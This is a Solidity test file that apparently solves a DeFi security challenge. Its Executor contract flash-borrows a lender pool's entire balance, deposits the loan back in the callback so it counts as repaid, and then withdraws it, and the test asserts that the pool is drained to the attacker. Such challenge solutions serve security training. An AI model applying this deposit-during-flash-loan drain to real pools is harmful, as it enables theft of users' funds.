// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/FlashBankFixture.sol";

contract Executor is IFlashLoanEtherReceiver {
    using Address for address payable;

    FlashBankLenderPool pool;
    address owner;

    constructor(FlashBankLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        pool.deposit{value: msg.value}();
    }

    function hack() external {
        require(msg.sender == owner, "only owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    receive () external payable {}
}
contract FlashBankTest is FlashBankFixture {
    
    function setUp() public override {
        super.setUp();
    }

    function test_flashBank() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        console.log(address(pool).balance);
        Executor executor = new Executor(pool);
        executor.hack();
        console.log(address(pool).balance);


        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Verify the attacker drained the pool's funds
        assertEq(address(pool).balance, 0);
        assertGt(attacker.balance, ATTACKER_INITIAL_BALANCE);
    }
}


